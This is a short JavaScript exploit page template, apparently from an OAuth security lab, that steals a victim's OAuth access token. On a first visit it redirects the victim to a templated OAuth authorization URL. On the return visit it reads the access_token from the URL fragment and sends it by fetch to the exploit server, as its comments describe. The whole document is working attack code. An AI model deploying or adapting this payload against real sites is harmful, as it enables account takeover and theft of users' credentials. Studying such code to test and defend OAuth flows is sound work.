const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');

if(!token) {
    // On the victim's first pass, they will be redirected to the OAuth URL
    document.location = "{{ req.prepare().url }}";
} else {
    // On the victim's second pass, they will make an HTTP request to the
    // exploit server with their access token in the URL
    fetch(`/?token=${token}`);
}